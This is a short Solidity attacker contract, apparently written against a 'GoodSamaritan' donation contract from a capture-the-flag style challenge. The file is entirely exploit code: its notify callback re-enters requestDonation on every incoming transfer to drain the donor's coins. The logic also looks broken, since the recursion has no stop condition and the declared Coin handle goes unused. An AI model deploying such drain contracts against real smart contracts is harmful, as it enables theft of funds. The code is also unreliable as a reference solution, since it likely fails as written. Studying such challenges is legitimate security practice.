pragma solidity ^0.8.0;

interface GoodSamaritan {
    function requestDonation() external returns (bool);
}

interface Coin {
    function transfer(address dest_, uint256 amount_) external;
    function balanceOf(address) external view returns (uint256);
}

contract UpdatedAttacker {
    address public instance;
    Coin public coin;

    constructor(address goodSamaritanInstance, address coinAddress) {
        instance = goodSamaritanInstance;
        coin = Coin(coinAddress);
    }

    function attack() public {
        GoodSamaritan(instance).requestDonation();
    }

    // Called when receiving coin transfers
    function notify(uint256 amount) public {
        attack();
    }
}
